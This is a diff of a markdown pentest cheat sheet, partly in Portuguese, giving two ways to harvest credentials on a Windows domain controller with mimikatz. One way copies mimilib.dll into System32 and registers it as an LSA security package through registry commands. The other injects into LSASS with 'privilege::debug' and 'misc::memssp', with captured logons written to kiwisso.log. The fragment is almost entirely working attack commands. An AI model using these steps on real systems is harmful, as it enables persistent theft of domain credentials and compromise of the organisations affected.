@@ -1554,11 +1554,9 @@ expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
 cd x64
 .\mimikatz.exe
 ```
+OPTION 1 - COPIAR DLL E ALTERAR REGISTRO
 ```
 copy mimilib.dll C:\Windows\System32
-
-```
-```
 reg query hklm\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"
 Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'
 $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security packages
@@ -1569,9 +1567,11 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Pac
 
 OPTION 2 - USING MIMIKLATZ INJECT INTO LASS (NOT STABLE 2016)
 ```
+privilege::debug
 misc::memssp
 ```
-
+All Local Logons on the DC are logged to:
+C:\Windows\System32\kiwisso.log
 
 
 
